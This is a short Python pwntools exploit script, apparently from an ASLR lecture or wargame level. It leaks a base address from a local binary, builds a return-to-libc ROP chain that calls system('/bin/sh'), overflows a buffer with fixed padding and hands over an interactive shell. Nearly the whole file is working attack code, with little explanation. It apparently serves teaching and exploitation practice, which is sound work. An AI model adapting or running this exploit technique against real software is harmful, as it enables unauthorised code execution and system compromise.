# lecture: lecture

from pwn import *

def main():

  argv1 = "B" * 27 # BULL
  argv2 = "S" * 3  # SHIT - like trying this without pwntools
  proc = process(["/levels/lecture/aslr/aslr_leak2", argv1, argv2])

  base_addr = int(proc.recvline()[30:-1][::-1].encode('hex'), 16)
  log.info("Leaked address 0x%x" % (base_addr))


  log.info("Sending evil buffer")
  proc.sendline(exploit_buffer(base_addr))

  log.success("Enjoy ur shell!")
  proc.interactive()

def generate_chain(base):

  rop_gadgets = [
    base-5,        # ret
    base-5,        # ret
    base-0x1a0510, # <__libc_system>
    0x41414141,    # return address
    base-0x7dad4,  # *ptr -> "/bin/sh"
  ]

  return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

def exploit_buffer(base):

  offset    = "A" * 28
  retAddr   = struct.pack('<L', base-5) # ret
  rop_chain = generate_chain(base)

  return ( "%s%s%s\n" % ( offset, retAddr, rop_chain ) )

main()
